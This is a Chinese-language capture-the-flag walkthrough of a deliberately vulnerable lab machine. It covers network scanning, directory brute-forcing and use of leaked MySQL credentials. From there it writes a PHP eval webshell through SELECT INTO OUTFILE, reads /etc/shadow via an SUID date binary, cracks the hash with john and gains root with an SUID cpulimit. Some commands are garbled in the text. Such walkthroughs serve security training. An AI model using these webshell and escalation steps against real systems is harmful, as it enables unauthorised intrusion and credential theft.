## 信息收集

首先使用 Kali 中的 arp-scan 工具扫描内网资产：

```
arp-scan --interface\=eth0 192.168.226.0/24
```

  

![](../Images/604e3b07ca7a87df87cb7f6e827da780.png)

  

发现目标主机 192.168.226.135，使用 nmap 扫描其端口服务等信息：

```
nmap -sC -sV -p- -sT 192.168.226.135
```

  

![](../Images/6bb31500b5c33c420f61c83882b77dfb.png)

  

开了三个端口，首先查看 9000 端口，发现是一个 phpmyadmin：

![](../Images/e192c37e2f3bdb1be43ff95ebd66ecb5.png)

  

然后查看 80 口：

![](../Images/77643cca84b69566c476810c343a36b3.png)

  

一个很普通的站点，使用 dirsearch 扫描目录：

```
dirsearch -u http://192.168.226.135/ -e\* -w /usr/share/dirb/wordlists/common.txt
```

  

![](../Images/1e18fc1aa74dfac2eb8daf08cabb279b.png)

  

发现一个 backup 备份，访问：

  

![](../Images/92be54ef41885df85cf66e1e4383fd1f.png)

  

发现一个 mysql 备份文件，下载下来在里面发现了 MySQL 的用户名和密码：

  

![](../Images/86d211196f97a1bb26a085d4861c3fc1.png)

  

用这个用户名密码成功登录之前那个 phpmyadmin：

  

![](../Images/582e543da85e08f99dbd28c42930afa7.png)

  

首先执行 sql 语句查看是否设置了 secure\_file\_priv 选项：

```
show variables like '%secure\_file\_priv%';
```

  

![](../Images/a265d24e2023cf5284371ff131b6d2fb.png)

  

secure\_file\_priv 值为空，那我们便可以通过 MySql 写入Webshell：

```
select "<?php @eval($\_POST\[whoami\]);?>" into outfile '/var/www/html/shell.php';
```

  

![](../Images/fdfac811e55d12e7fba1741952064414.png)

  

蚁剑成功连接：

![](../Images/3935c29908a33d16ae45890acecbb106.png)

## 权限提升

首先尝试 SUID 提权：

```
find / -perm -u\=s -type f 2\>/dev/null
```

  

![](../Images/bbb7f441275d18fc16dcaf52f83c82ef.png)

  

没有发现常用的 SUID 提权命令，但是有一个 `/usr/bin/date` 命令可以尝试一下。我们去 Linux 提权辅助网站 Gtfobins 上面搜一下，确实发现了 date 命令的 SUID 提权利用方法：

  

![](../Images/4c682d9fffe68d6a22d4af542dab6f61.png)

  

大概意思就是我们可以通过以下形式以 root 权限来读取系统文件：

```
LFILE\=
file\_to\_read$LFILE

```

如下，我们尝试读取 /etc/shadow 文件，该文件用于存储 Linux 系统中用户的密码信息：

```
LFILE\=
/etc/shadow$LFILE
```

  

![](../Images/49ba138b1d137eea0fb33ed237ca7080.png)

  

如上图所示，在使用 date 之前没有读取 /etc/shadow 的权限，使用 date 提权之后成功读取到了 /etc/shadow 的内容。然后我们就可以使用 john 工具对 hacksudo 用户的哈希进行暴力破解了：

```
john hash.txt --wordlist\=
/usr/share/wordlists/rockyou.txt
```

爆破成功，得到 hacksudo 的密码为 aliens：

![](../Images/abc3a4e70e9ae90584760921f41ffdea.png)

  

拿到 hacksudo 的密码之直接接切换到 hacksudo：

  

![](../Images/c68414c035e7594102e17ea00b9101e7.png)

  

再次尝试 SUID 提权：

```
find / -perm -u\=s -type f 2\>/dev/null
```

  

![](../Images/21e754da5e079cce2e8a4088ef4184fa.png)

  

如上图所示，在 hacksudo 的下载目录中发现了一个 cpulimit，这个工具是用来查看 CPU 使用情况的，在 Gtfobins 上面也可以找到他的 SUID 提权方法：

  

![](../Images/6326793ab40dfda43113c8e955b9f141.png)

根据文档尝试提权：

```
/home/hacksudo/Downloads/cpulimit -l 100 -f -- /bin/sh -p
```

  

![](../Images/9d83af795635243e89437423b7dad911.png)

  

如上图所示，成功提权。

然后在 /root 目录中刚发现了 flag：
